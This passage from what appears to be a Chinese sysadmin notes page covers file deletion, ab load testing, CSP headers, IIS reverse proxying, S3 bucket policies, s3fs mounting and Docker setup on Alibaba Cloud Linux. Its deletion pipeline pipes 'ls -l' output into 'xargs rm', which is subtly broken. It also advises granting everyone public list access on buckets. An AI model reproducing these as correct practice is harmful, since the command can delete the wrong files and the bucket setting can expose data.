<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># find 查询大量文件删除时会很慢，可以用ls 配合 grep 查询需要删除的文件，然后删除</span>
</span></span><span class="line"><span class="cl">$&gt; find /path/to/directory -type f -name <span class="s2">&#34;*.txt&#34;</span> -exec ls -l <span class="o">{}</span> <span class="se">\;</span> <span class="p">|</span> grep <span class="s2">&#34;pattern&#34;</span> <span class="p">|</span> xargs rm</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="压力测试-ab-命令解释" class="heading-element"><span>压力测试 `ab`` 命令解释</span>
  <a href="#%e5%8e%8b%e5%8a%9b%e6%b5%8b%e8%af%95-ab-%e5%91%bd%e4%bb%a4%e8%a7%a3%e9%87%8a" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># httpd-tools </span>
</span></span><span class="line"><span class="cl"><span class="c1"># -n: 总共要发送的请求 </span>
</span></span><span class="line"><span class="cl"><span class="c1"># -c: 并发连接</span>
</span></span><span class="line"><span class="cl"><span class="c1"># -r: 随机数据，防止缓存</span>
</span></span><span class="line"><span class="cl"><span class="c1">## 例如: 50个人，每秒访问100次, 那么总共发送请求为 50 * 100 = 5000 (-n)</span>
</span></span><span class="line"><span class="cl">$&gt; ab -n <span class="m">5000</span> -c <span class="m">50</span> -r http://www.example.com/</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="https页面加载http资源报错的方法" class="heading-element"><span>https页面加载http资源报错的方法</span>
  <a href="#https%e9%a1%b5%e9%9d%a2%e5%8a%a0%e8%bd%bdhttp%e8%b5%84%e6%ba%90%e6%8a%a5%e9%94%99%e7%9a%84%e6%96%b9%e6%b3%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>解决方案:</p>
<ol>
<li>服务端设置<code>header</code>: <code>header(&quot;Content-Security-Policy: upgrade-insecure-requests&quot;);</code></li>
<li>页面设置<code>meta</code>头: <code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;upgrade-insecure-requests&quot; /&gt;</code></li>
<li>删除链接中的协议头: <code>&lt;script src='//cdn.bootcss.com/jquery/3.3.1/jquery.min.js'&gt;&lt;/script&gt;</code></li>
<li><code>nginx</code>添加<code>header</code>: <code>add_header Content-Security-Policy &quot;upgrade-insecure-requests&quot;;</code></li>
</ol>
<h2 id="mysql-授权-all-privileges-时当前用户是具备执行-alter-user-的权限的但仅限于修改自己的密码无法修改其他用户" class="heading-element"><span>mysql 授权 ALL PRIVILEGES 时，当前用户是具备执行 ALTER USER 的权限的，但仅限于修改自己的密码，无法修改其他用户</span>
  <a href="#mysql-%e6%8e%88%e6%9d%83-all-privileges-%e6%97%b6%e5%bd%93%e5%89%8d%e7%94%a8%e6%88%b7%e6%98%af%e5%85%b7%e5%a4%87%e6%89%a7%e8%a1%8c-alter-user-%e7%9a%84%e6%9d%83%e9%99%90%e7%9a%84%e4%bd%86%e4%bb%85%e9%99%90%e4%ba%8e%e4%bf%ae%e6%94%b9%e8%87%aa%e5%b7%b1%e7%9a%84%e5%af%86%e7%a0%81%e6%97%a0%e6%b3%95%e4%bf%ae%e6%94%b9%e5%85%b6%e4%bb%96%e7%94%a8%e6%88%b7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h2 id="windows-iis-反向代理配置" class="heading-element"><span>Windows IIS 反向代理配置</span>
  <a href="#windows-iis-%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86%e9%85%8d%e7%bd%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p><a href="https://github.com/axllent/mailpit/issues/131"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/axllent/mailpit/issues/131<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</blockquote>
<ol>
<li>前置条件
<ul>
<li>安装 <a href="https://www.iis.net/downloads/microsoft/url-rewrite"target="_blank" rel="external nofollow noopener noreferrer"><code>url-rewrite</code><i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a> 模块</li>
<li>安装 <a href="https://www.iis.net/downloads/microsoft/application-request-routing"target="_blank" rel="external nofollow noopener noreferrer"><code>application-request-routing</code><i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a> 模块(此项安装前，必须先安装 <code>url-rewrite</code> 模块)</li>
</ul>
</li>
<li>配置
<ul>
<li>打开<code>IIS</code>,找到 <code>Application Request Routing Cache</code>打开，点击右侧<code>Server Proxy Setings</code>,勾选 <code>Enable proxy</code>，点击右侧<code>应用</code>即可。</li>
<li>打开<code>IIS</code>,选择网站, 打开 <code>URL Rewrite(URL 重写)</code>, 点击右侧<code>添加规则</code>，选择<code>空白规则</code>，模式配置<code>(.*)</code>,操作选择<code>重写</code>, 重写URL设置需要反向代理的地址, 例如: 需要代理到 <code>http://127.0.0.1:8080/</code>,则填写 <code>http://127.0.0.1:8080/{R:1}</code>，其他默认，保存即可。</li>
</ul>
</li>
</ol>
<h2 id="亚马逊存储桶" class="heading-element"><span>亚马逊存储桶</span>
  <a href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e5%ad%98%e5%82%a8%e6%a1%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><em><strong>新建存储通无论是公开或私有，应优先考虑以下规则</strong></em></p>
<ol>
<li>创建存储桶(可公有访问权限)</li>
<li>设置&quot;对象所有权&quot;为<code>ACL已启用</code></li>
<li>设置&quot;对象所有权&quot;为<code>存储桶拥有者优先</code>。</li>
<li>将 <code>此存储桶的“屏蔽公共访问权限”设置</code>取消<code>阻止所有公开访问</code>勾选，只勾选<code>阻止通过新公有存储桶策略或接入点策略授予的存储桶和对象公有访问</code>和<code>阻止通过任何公有存储桶策略或接入点策略对存储桶和对象的公有和跨账户访问</code>，其他默认即可</li>
</ol>
<h3 id="存储桶规则创建及示例" class="heading-element"><span>存储桶规则创建及示例</span>
  <a href="#%e5%ad%98%e5%82%a8%e6%a1%b6%e8%a7%84%e5%88%99%e5%88%9b%e5%bb%ba%e5%8f%8a%e7%a4%ba%e4%be%8b" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li>
<p>存储桶策略</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// 此策略是为授权 cloudfront 可访问 S3 特定存储桶的所有读取权限(通过此方法设定的可以不受存储桶默认文件权限限制。根据上述存储桶规则创建内容，默认上传权限是不允许公网读的)
</span></span></span><span class="line"><span class="cl"><span class="c1">// CDN 创建时候设置 
</span></span></span><span class="line"><span class="cl"><span class="c1">// Origin domain:  (&lt;存储桶名&gt;.s3.&lt;区域名&gt;.amazonaws.com)  
</span></span></span><span class="line"><span class="cl"><span class="c1">// 来源访问: 来源访问控制设置 - Create new OAC
</span></span></span><span class="line"><span class="cl"><span class="c1">// 其他参数默认即可 
</span></span></span><span class="line"><span class="cl"><span class="c1">// 以下json可以在cdn创建成功后，通过提示窗口直接复制，然后添加到 存储桶-权限-存储桶策略 中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="s2">&#34;2008-10-17&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Id&#34;</span><span class="p">:</span> <span class="s2">&#34;PolicyForCloudFrontPrivateContent&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Statement&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Sid&#34;</span><span class="p">:</span> <span class="s2">&#34;AllowCloudFrontServicePrincipal&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Allow&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Principal&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&#34;Service&#34;</span><span class="p">:</span> <span class="s2">&#34;cloudfront.amazonaws.com&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="s2">&#34;s3:GetObject&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Resource&#34;</span><span class="p">:</span> <span class="s2">&#34;arn:aws:s3:::&lt;存储桶名&gt;/*&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Condition&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&#34;StringEquals&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;AWS:SourceArn&#34;</span><span class="p">:</span> <span class="s2">&#34;CND创建成功后的arn&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>访问控制列表(ACL): 这个权限控制我测试发现似乎只是控制程序用户是否可以操作存储桶内容的。</p>
</li>
<li>
<p>s3fs 挂载:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## https://github.com/s3fs-fuse/s3fs-fuse</span>
</span></span><span class="line"><span class="cl"><span class="c1">## 注意: 启用OAC的需要使用 sigv4 才能正常连接 </span>
</span></span><span class="line"><span class="cl">$&gt; vim /etc/fstab 
</span></span><span class="line"><span class="cl">s3fs#&lt;存储桶名&gt; &lt;挂载到的目录&gt; fuse auto,_netdev,sigv4,allow_other,passwd_file<span class="o">=</span>/etc/sysconfig/passwd-s3fs,endpoint<span class="o">=</span>ap-east-1,use_path_request_style,url<span class="o">=</span>https://s3.ap-east-1.amazonaws.com <span class="m">0</span> <span class="m">0</span></span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h3 id="亚马逊用户策略" class="heading-element"><span>亚马逊用户策略</span>
  <a href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e7%94%a8%e6%88%b7%e7%ad%96%e7%95%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// 方案一 
</span></span></span><span class="line"><span class="cl"><span class="c1">// 注意: 若是按照上面存储通步骤创建存储桶，那么需要手动打开 `权限` - `访问控制列表(ACL)` 中 所有人(公有访问权限) 的 `列出` 权限，否则通过api无法正常操作(s3 brower也需要开启此项设置)
</span></span></span><span class="line"><span class="cl"><span class="c1">// 以下策略用于控制仅限`特定用户`操作特定的存储桶，该策略附加给用户
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="s2">&#34;2012-10-17&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Statement&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Allow&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;s3:*&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Resource&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;arn:aws:s3:::&lt;存储桶名&gt;/*&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 方案二 
</span></span></span><span class="line"><span class="cl"><span class="c1">// 以下策略设置在 `存储桶` - `权限` - `存储桶策略` 中，用于控制存储桶接受那个用户操作，该策略是附加给存储桶的 
</span></span></span><span class="line"><span class="cl"><span class="c1">// https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/example-bucket-policies.html
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="s2">&#34;2012-10-17&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Statement&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Sid&#34;</span><span class="p">:</span> <span class="s2">&#34;AddPublicReadCannedAcl&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Allow&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Principal&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&#34;AWS&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;用户的ARN&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;s3:*&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Resource&#34;</span><span class="p">:</span> <span class="s2">&#34;arn:aws:s3:::存储桶名/*&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Condition&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&#34;StringEquals&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;s3:x-amz-acl&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">                        <span class="s2">&#34;public-read&#34;</span> <span class="c1">// 必须指定的ACL权限
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gnome-shell-终端设置-title" class="heading-element"><span>gnome-shell 终端设置 title</span>
  <a href="#gnome-shell-%e7%bb%88%e7%ab%af%e8%ae%be%e7%bd%ae-title" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; <span class="nb">export</span> <span class="nv">PROMPT_COMMAND</span><span class="o">=</span><span class="s1">&#39;echo -ne &#34;\033]0; ${USER}@${HOSTNAME} \007&#34;&#39;</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="阿里云安装-alinux-操作系统安装-docker" class="heading-element"><span>阿里云安装 alinux 操作系统安装 docker</span>
  <a href="#%e9%98%bf%e9%87%8c%e4%ba%91%e5%ae%89%e8%a3%85-alinux-%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e5%ae%89%e8%a3%85-docker" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># aliyun的两个云镜像要安装docker都得安装一个兼容插件，否则在官方仓库中找不到对应的地址 </span>
</span></span><span class="line"><span class="cl"><span class="c1">## Alibaba Cloud Linux 2</span>
</span></span><span class="line"><span class="cl">$&gt; wget -O /etc/yum.repos.d/docker-ce.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
</span></span><span class="line"><span class="cl">$&gt; sudo yum install yum-plugin-releasever-adapter --disablerepo<span class="o">=</span>* --enablerepo<span class="o">=</span>plus     <span class="c1"># 兼容插件</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Alibaba Cloud Linux 3</span>
</span></span><span class="line"><span class="cl">$&gt; dnf config-manager --add-repo<span class="o">=</span>https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
</span></span><span class="line"><span class="cl">$&gt; sudo dnf -y install dnf-plugin-releasever-adapter --repo alinux3-plus    <span class="c1"># 兼容插件</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="亚马逊cdn-添加-elb-作为后端源指定多备用域名无效有其他衍生问题-待继续测试" class="heading-element"><span>亚马逊cdn 添加 elb 作为后端源，指定多备用域名无效(有其他衍生问题, 待继续测试)</span>
